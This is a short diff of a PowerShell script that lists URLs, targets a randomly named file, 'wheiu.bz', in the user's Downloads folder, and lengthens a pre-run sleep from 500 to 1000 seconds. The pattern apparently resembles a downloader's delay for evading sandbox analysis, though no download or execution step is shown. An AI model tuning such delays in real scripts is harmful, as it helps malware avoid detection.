@@ -7,7 +7,7 @@ $urls = @(
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
 
-Start-Sleep -Seconds 500
+Start-Sleep -Seconds 1000
 
 $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
 if (-not (Test-Path -Path $downloadDir)) {
